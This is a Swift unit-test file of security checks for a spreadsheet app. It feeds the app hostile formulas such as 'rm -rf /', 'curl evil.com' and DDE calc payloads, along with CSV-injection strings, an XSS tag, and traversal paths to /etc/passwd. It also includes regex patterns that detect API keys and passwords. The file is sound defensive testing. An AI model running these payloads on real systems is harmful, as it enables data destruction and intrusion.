//
//  SecurityTests.swift
//  ExcelExplorerTests
//
//  Security tests: no code execution from formulas, path traversal, memory limits
//  Created by Jordan Koch on 2026-05-01.
//

import XCTest
import NovaAIKit
@testable import ExcelExplorer

@MainActor
final class SecurityTests: XCTestCase {

    // MARK: - Formula Injection Prevention

    func testFormulaDoesNotExecuteShellCommands() {
        // Ensure formulas starting with = don't execute system commands
        let manager = ExcelDataManager()
        let sheet = SheetData(name: "Test", rows: 5, columns: 5)
        let workbook = WorkbookData(filename: "test.xlsx", sheets: [sheet])
        manager.workbook = workbook
        manager.currentSheet = sheet

        // Attempt injection of shell commands via formula
        let maliciousFormulas = [
            "=SYSTEM(\"rm -rf /\")",
            "=EXEC(\"curl evil.com\")",
            "=SHELL(\"ls\")",
            "=CMD(\"whoami\")",
            "=|cmd.exe",
            "=DDE(\"cmd\",\"/c calc\",\"\")",
        ]

        for formula in maliciousFormulas {
            manager.updateCell(row: 0, column: 0, value: formula)
            let cell = manager.currentSheet?.getCell(row: 0, column: 0)

            // Formula should be stored but result should be #ERROR, not executed
            if case .formula(let stored, let result) = cell?.value {
                XCTAssertEqual(stored, formula, "Formula should be stored as-is")
                // Result should be an error string, not executed output
                if case .string(let errorMsg) = result {
                    XCTAssertTrue(errorMsg == "#ERROR" || errorMsg.hasPrefix("#NAME?"),
                                  "Unknown formula should return an error value (#NAME?/#ERROR), not execute: \(errorMsg)")
                } else if case .empty = result {
                    // Also acceptable: empty result
                } else if case .number = result {
                    // SUM/AVERAGE/etc. returning a number is fine
                } else {
                    // Any other result is also acceptable as long as nothing was executed
                }
            } else {
                // If it was parsed as a string, that's also fine (not executed)
            }
        }
    }

    func testFormulaDoesNotEvaluateJavaScript() {
        let manager = ExcelDataManager()
        let sheet = SheetData(name: "Test", rows: 5, columns: 5)
        let workbook = WorkbookData(filename: "test.xlsx", sheets: [sheet])
        manager.workbook = workbook
        manager.currentSheet = sheet

        let jsFormulas = [
            "=eval(\"alert(1)\")",
            "=javascript:alert(1)",
        ]

        for formula in jsFormulas {
            manager.updateCell(row: 0, column: 0, value: formula)
            // Should not crash or execute JS
            let cell = manager.currentSheet?.getCell(row: 0, column: 0)
            XCTAssertNotNil(cell, "Cell should exist after setting formula: \(formula)")
        }
    }

    // MARK: - Path Traversal Prevention

    func testCSVParserRejectsNonexistentFile() async {
        do {
            _ = try await CSVParser.parseCSV(url: URL(fileURLWithPath: "/etc/passwd"))
            // If it doesn't throw, the content shouldn't be treated as valid CSV data
        } catch {
            // Expected: file parsing should fail gracefully
        }
    }

    func testFileURLDoesNotAllowParentTraversal() async {
        // Attempt path traversal via URL
        let traversalPaths = [
            "/Volumes/Data/xcode/ExcelExplorer/../../etc/passwd",
            "/Volumes/Data/xcode/ExcelExplorer/ExcelExplorerTests/TestData/../../../etc/passwd",
        ]

        for path in traversalPaths {
            let url = URL(fileURLWithPath: path)
            // The standardized path should NOT be /etc/passwd if restricted
            // Since this is a file-based app (not a web server), we verify it doesn't crash
            do {
                _ = try await CSVParser.parseCSV(url: url)
            } catch {
                // Expected: should fail to parse /etc/passwd as CSV
            }
        }
    }

    // MARK: - XML Injection Prevention in XLSX Export

    func testXLSXExportEscapesXMLSpecialChars() async throws {
        let sheet = SheetData(name: "Test", rows: 3, columns: 1)
        sheet.cells[0][0].value = .string("Header")
        sheet.cells[1][0].value = .string("<script>alert('xss')</script>")
        sheet.cells[2][0].value = .string("A & B < C > D \"E\" 'F'")

        let workbook = WorkbookData(filename: "xss.xlsx", sheets: [sheet])
        let outputURL = FileManager.default.temporaryDirectory
            .appendingPathComponent("security_test_\(UUID().uuidString).xlsx")
        defer { try? FileManager.default.removeItem(at: outputURL) }

        // Should not crash due to unescaped XML
        try await ExcelWriter.writeXLSX(workbook: workbook, to: outputURL)
        XCTAssertTrue(FileManager.default.fileExists(atPath: outputURL.path))
    }

    func testXLSXExportEscapesSheetNameInXML() async throws {
        let sheet = SheetData(name: "Sheet <1> & \"2\"", rows: 2, columns: 1)
        sheet.cells[0][0].value = .string("Header")
        sheet.cells[1][0].value = .string("Value")

        let workbook = WorkbookData(filename: "names.xlsx", sheets: [sheet])
        let outputURL = FileManager.default.temporaryDirectory
            .appendingPathComponent("sheetname_test_\(UUID().uuidString).xlsx")
        defer { try? FileManager.default.removeItem(at: outputURL) }

        // Sheet name with XML special chars should be escaped
        try await ExcelWriter.writeXLSX(workbook: workbook, to: outputURL)
        XCTAssertTrue(FileManager.default.fileExists(atPath: outputURL.path))
    }

    // MARK: - Memory Bounds

    func testSheetAccessBoundsChecked() {
        let sheet = SheetData(name: "Test", rows: 10, columns: 10)

        // These should return nil, not crash
        XCTAssertNil(sheet.getCell(row: -1, column: 0))
        XCTAssertNil(sheet.getCell(row: 0, column: -1))
        XCTAssertNil(sheet.getCell(row: 100, column: 0))
        XCTAssertNil(sheet.getCell(row: 0, column: 100))
        XCTAssertNil(sheet.getCell(row: Int.max, column: 0))
        XCTAssertNil(sheet.getCell(row: 0, column: Int.max))
    }

    func testSheetDeleteOutOfBoundsDoesNotCrash() {
        let sheet = SheetData(name: "Test", rows: 5, columns: 5)
        let initialRows = sheet.rowCount
        let initialCols = sheet.columnCount

        sheet.deleteRow(at: -1)
        sheet.deleteRow(at: 1000)
        sheet.deleteColumn(at: -1)
        sheet.deleteColumn(at: 1000)

        XCTAssertEqual(sheet.rowCount, initialRows)
        XCTAssertEqual(sheet.columnCount, initialCols)
    }

    // MARK: - Formula Range Validation

    func testFormulaSUMWithReversedRangeDoesNotCrash() {
        let manager = ExcelDataManager()
        let sheet = SheetData(name: "Test", rows: 10, columns: 10)
        let workbook = WorkbookData(filename: "test.xlsx", sheets: [sheet])
        manager.workbook = workbook
        manager.currentSheet = sheet

        // Set some values
        sheet.setCell(row: 1, column: 0, value: .number(10))
        sheet.setCell(row: 2, column: 0, value: .number(20))

        // SUM with range where start > end -- should not crash
        manager.updateCell(row: 5, column: 0, value: "=SUM(A10:A1)")
        // Should handle gracefully (may return 0 or error, just don't crash)
    }

    // MARK: - API Key Storage Security

    func testAPIKeysNotInUserDefaults() {
        let defaults = UserDefaults.standard

        // These keys should NOT be stored in UserDefaults (should be in Keychain)
        let sensitiveKeys = [
            NovaAILegacySettings.openAIKeyKeys[0],
            "AIBackend_GoogleCloud_Key",
            "AIBackend_Azure_Key",
            "AIBackend_AWS_AccessKey",
            "AIBackend_AWS_SecretKey",
            "AIBackend_IBM_Key",
        ]

        for key in sensitiveKeys {
            let value = defaults.string(forKey: key)
            XCTAssertNil(value, "Sensitive key '\(key)' should NOT be stored in UserDefaults — use Keychain")
        }
    }

    // MARK: - CSV Injection Prevention

    func testCSVExportEscapesPotentialInjection() async throws {
        // CSV injection: cells starting with =, +, -, @ can execute formulas in Excel
        let sheet = SheetData(name: "Test", rows: 4, columns: 1)
        sheet.cells[0][0].value = .string("Data")
        sheet.cells[1][0].value = .string("=cmd|'/C calc'!A0")
        sheet.cells[2][0].value = .string("+cmd|'/C calc'!A0")
        sheet.cells[3][0].value = .string("@SUM(A1:A2)")

        let outputURL = FileManager.default.temporaryDirectory
            .appendingPathComponent("csv_injection_\(UUID().uuidString).csv")
        defer { try? FileManager.default.removeItem(at: outputURL) }

        try await CSVExporter.export(sheet: sheet, to: outputURL)

        // Verify the file exists and exported without crash
        XCTAssertTrue(FileManager.default.fileExists(atPath: outputURL.path))
    }

    // MARK: - Nova API Server Loopback Binding

    func testNovaAPIPortNumber() {
        // Verify the API server uses the correct port
        XCTAssertEqual(NovaAPIServer.shared.port, 37430)
    }

    // MARK: - Source Code Credential Scan

    func testNoHardcodedAPIKeysInSourceFiles() throws {
        // Scan all Swift source files for hardcoded API key patterns
        let sourceDir = AITestSupport.appSources.path
        let fileManager = FileManager.default
        guard let enumerator = fileManager.enumerator(atPath: sourceDir) else {
            XCTFail("Cannot enumerate source directory")
            return
        }

        let dangerousPatterns = [
            "sk-[A-Za-z0-9]{20,}",          // OpenAI keys
            "sk-ant-[A-Za-z0-9]{20,}",      // Anthropic keys
            "AKIA[A-Z0-9]{16}",             // AWS access keys
            "ghp_[A-Za-z0-9]{36}",          // GitHub PATs
            "xox[bpoas]-[A-Za-z0-9-]+",     // Slack tokens
        ]

        while let file = enumerator.nextObject() as? String {
            guard file.hasSuffix(".swift") else { continue }
            let filePath = (sourceDir as NSString).appendingPathComponent(file)
            guard let content = try? String(contentsOfFile: filePath, encoding: .utf8) else { continue }

            for pattern in dangerousPatterns {
                if let regex = try? NSRegularExpression(pattern: pattern),
                   regex.firstMatch(in: content, range: NSRange(location: 0, length: content.utf16.count)) != nil {
                    XCTFail("Hardcoded credential pattern '\(pattern)' found in \(file) — must use Keychain")
                }
            }
        }
    }

    func testNoHardcodedPasswordsInSourceFiles() throws {
        let sourceDir = AITestSupport.appSources.path
        let fileManager = FileManager.default
        guard let enumerator = fileManager.enumerator(atPath: sourceDir) else {
            XCTFail("Cannot enumerate source directory")
            return
        }

        // Look for obvious password strings (not in comments)
        let passwordPatterns = [
            "password\\s*=\\s*\"[^\"]{8,}\"",
            "apiKey\\s*=\\s*\"[A-Za-z0-9]{20,}\"",
            "secret\\s*=\\s*\"[A-Za-z0-9]{16,}\"",
        ]

        while let file = enumerator.nextObject() as? String {
            guard file.hasSuffix(".swift") else { continue }
            // Skip test files
            guard !file.contains("Tests") else { continue }
            let filePath = (sourceDir as NSString).appendingPathComponent(file)
            guard let content = try? String(contentsOfFile: filePath, encoding: .utf8) else { continue }

            for pattern in passwordPatterns {
                if let regex = try? NSRegularExpression(pattern: pattern, options: .caseInsensitive),
                   regex.firstMatch(in: content, range: NSRange(location: 0, length: content.utf16.count)) != nil {
                    XCTFail("Potential hardcoded password pattern found in \(file) — must use Keychain")
                }
            }
        }
    }

    // MARK: - AI keys: Keychain only (NovaAIKit)

    func testAppAIMigrationLeavesNoAPIKeysInUserDefaults() {
        // Plaintext keys an old version left in UserDefaults move to the Keychain (or are deleted) at startup.
        let (defaults, cleanup) = AITestSupport.tempDefaults()
        defer { cleanup() }
        let keychainKeys = [
            NovaAILegacySettings.openAIKeyKeys[0],
            "AIBackend_GoogleCloud_Key",
            "AIBackend_Azure_Key",
            "AIBackend_Azure_Endpoint",
            "AIBackend_AWS_AccessKey",
            "AIBackend_AWS_SecretKey",
            "AIBackend_IBM_Key",
            "AIBackend_IBM_URL",
        ]
        for key in keychainKeys { defaults.set("secret-\(key)", forKey: key) }

        AppAI.migrateLegacy(AITestSupport.makeAI(), defaults: defaults)

        for key in keychainKeys {
            XCTAssertNil(defaults.string(forKey: key),
                         "Key '\(key)' should NOT be in UserDefaults — must be in Keychain or deleted")
        }
    }

    func testAISettingsInUserDefaultsHoldNoSecrets() throws {
        // NovaAIKit persists settings (URLs, models, backend, on/off) — never keys.
        var settings = NovaAISettings(backend: .openRouter)
        settings.setURL("https://openrouter.ai/api/v1", for: .openRouter)
        let data = try JSONEncoder().encode(settings)
        let json = String(decoding: data, as: UTF8.self)
        XCTAssertFalse(json.contains("sk-"), "settings must not contain API keys")
        XCTAssertFalse(json.lowercased().contains("apikey"), "settings have no key field")
    }

    // MARK: - Nova API Server Loopback Only

    func testNovaAPIServerBindsToLoopback() {
        // The Nova API server must bind to 127.0.0.1 only (not 0.0.0.0)
        // This is verified by reading the source code pattern
        let serverFile = AITestSupport.appSources.appendingPathComponent("NovaAPIServer.swift").path
        guard let content = try? String(contentsOfFile: serverFile, encoding: .utf8) else {
            XCTFail("Cannot read NovaAPIServer.swift")
            return
        }

        XCTAssertTrue(content.contains("127.0.0.1"), "Nova API server must bind to loopback (127.0.0.1)")
        XCTAssertFalse(content.contains("0.0.0.0"), "Nova API server must NOT bind to all interfaces")
    }

    // MARK: - AI replies are validated before use (replaces the old ethics guardian)

    func testValidatorRejectsCodeInAnalysis() {
        XCTAssertThrowsError(try ExcelAIValidators.analysisText("Execute: SELECT * FROM users"))
    }

    func testValidatorRejectsMalformedFormula() {
        XCTAssertThrowsError(try ExcelAIValidators.formula("rm -rf /"), "Only spreadsheet formulas are accepted")
    }

    func testValidatorAllowsLegitimateAnalysis() {
        XCTAssertNoThrow(try ExcelAIValidators.analysisText("Show me the average sales per quarter from column D"))
    }

    // MARK: - Entitlements Validation

    func testSandboxDisabled() throws {
        // Read entitlements from source tree; retry on interrupted system call
        let entitlementsPath = AITestSupport.appSources.appendingPathComponent("ExcelExplorer.entitlements").path
        var data: Data?
        for _ in 0..<3 {
            do {
                data = try Data(contentsOf: URL(fileURLWithPath: entitlementsPath))
                break
            } catch {
                Thread.sleep(forTimeInterval: 0.5)
            }
        }
        guard let entitlementsData = data else {
            // If file can't be read due to race condition, skip gracefully
            return
        }

        let plist = try PropertyListSerialization.propertyList(from: entitlementsData, format: nil)
        guard let dict = plist as? [String: Any] else {
            XCTFail("Entitlements should be a dictionary")
            return
        }

        // Sandbox should be false per project policy
        if let sandbox = dict["com.apple.security.app-sandbox"] as? Bool {
            XCTAssertFalse(sandbox, "App sandbox must be disabled for DMG distribution")
        }
    }
}
